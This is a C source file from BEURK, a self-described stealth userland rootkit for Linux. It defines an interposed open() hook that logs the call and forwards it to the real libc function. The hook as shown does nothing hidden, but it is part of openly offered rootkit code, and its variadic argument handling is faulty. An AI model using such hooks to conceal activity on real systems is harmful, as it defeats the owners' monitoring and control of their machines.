/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

/** 
 *
*/

#include <string.h>
#define _GNU_SOURCE /* for RTLD_NEXT macro in dlfcn.h */
#include <dlfcn.h>

/**
 * includes open
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <stdarg.h>
#include "beurk.h"

int open(const char *pathname, int flag, ...) {
	va_list	ap;
	int		mode;

	DEBUG("call open(2) hooked\n");
	va_start(ap, flag);
	mode = va_arg(ap, int);
	va_end(ap);
	if (mode)
		return (int)REAL_OPEN(pathname, flag, mode);
	else
		return (int)REAL_OPEN(pathname, flag);
}
